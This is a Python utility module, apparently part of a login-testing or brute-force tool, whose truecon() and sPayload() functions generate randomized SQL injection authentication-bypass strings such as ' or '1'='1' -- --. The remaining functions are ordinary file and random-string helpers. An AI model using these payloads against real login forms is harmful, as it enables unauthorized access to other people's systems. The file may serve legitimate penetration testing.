import random, sys, string
from utils.utils import die

# def getRootDir(pathModuleLocation):
# 	##################################
# 	#	Get root folder of module file
# 	#	/foo/bar/module.py
# 	#	---> return "/foo/bar"
# 	#################################
# 
# 	pathModuleLocation = "/".join(pathModuleLocation.split("/")[:-1])
# 	return pathModuleLocation

def truecon():
	# Generate true condition of SQL query
	"""
	Equal:
		' or '1'='1' -- --
	Static:
		1' or not false #
		1' or true #
	Compare:
		1' or 12 rlike 12 #
		2' or '2'>'0' -- --
		2' or 2>0 -- --
	"""
	# Payload template: ['or' | '||'] [condition] 
	def cCon():
		return randomFromList(["or", "||"])
	def sCon():
		conType = randomFromList(["equal", "static", "compare"])
		# Could be faster than create a dict and call element from dict
		if conType == "static":
			return randomFromList(["not false", "true"])

		elif conType == "compare":
			genType = randomFromList(["like", "rlike", "not like", "gl"])
		
			if genType == "gl":
				_stri1, _stri2 = srand(stype = "dig"), srand(stype = "dig")
				if int(_stri1) > int(_stri2):
					return "%s > %s" %(_stri1, _stri2)
				else:
					return "%s > %s" %(_stri2, _stri1)
		
			elif genType == "not like":
				while True:
					_stri1, _stri2 = srand(stype = "char"), srand(stype = "char")
					# MAKE SURE WE ARE HAVING NOT LIKE
					if _stri1 != _stri2:
						break
				return "'%s' %s '%s'" %(_stri1, genType, _stri2)
		
			else:
				_stri = srand(min = 3, max = 5, stype = "char")
				return "'%s' %s '%s'" %(_stri, genType, _stri)

		elif conType == "equal":
			genType = randomFromList(["char", "dig"])
			_stri = srand(min = 3, max = 5, stype = genType)
			if genType == "char":
				return "'%s'='%s'" %(_stri, _stri)
			elif genType == "dig":
				return "%s=%s" %(_stri, _stri)

	return "%s %s" %(cCon(), sCon())

def sPayload():
	def sEnd():
		return randomFromList(["-- --", "#"])
	# Generate random SQL injection payload
	# Payload template: [X / X' / X')] [True condition] [-- / #]

	fchar = ["", "'", ")", "')", "'))", "))"]

	for pchar in fchar:
		yield "%s %s %s" %(pchar, truecon(), sEnd())

def randomFromList(listData):
	return random.choice(listData)

def randomFromFile(pathFile):
	##########################################
	#	Return random User Agents from file
	#
	##########################################

	return randomFromList(fread(pathFile).split("\n"))


def lread(strUsername):
	#################################
	#	split input username to a list
	#	username -> [username]
	#	user1:user2 -> [user1, user2]
	#
	##################################

	return strUsername.split(":")

def fload(pathFile):
	###################################
	#	Read and return data file
	#	Return file object instead of list
	#
	###################################
	try:
		pFile = open(pathFile, 'r')
		return pFile
	except Exception as error:
		die("[x] Error while loading file!", error)
		
def fread(pathFile):
	try:
		pFile = fload(pathFile)
		return pFile.read()
	except Exception as error:
		die("[x] Error while reading data", error)
	finally:
		try:
			pFile.close()
		except:
			pass

def fwrite(pathFileLocation, writeData):
	try:
		objFileWrite = open(pathFileLocation, "w")
		objFileWrite.write(writeData)
	except Exception as error:
		die("[x] Error while writing data", error)
	finally:
		try:
			objFileWrite.close()
		except:
			pass

def fwrite_c(pathFileLocation, writeData):
	try:
		fileWrite = open(pathFileLocation, "a")
		fileWrite.write(writeData)
	except Exception as error:
		die("[x] Error while continuing write file", error)
	finally:
		fileWrite.close()

def srand(min = 2, max = 5, stype = "char"):
	# https://stackoverflow.com/a/2257449
	if stype == "char":
		charset = string.letters
	elif stype == "dig":
		charset = string.digits

	min, max = 0, random.randint(min, max)
	return ''.join(random.choice(charset) for _ in xrange(min, max))


if __name__ == "__main__":
	die("Oops! Wrong place", "Find other place")
	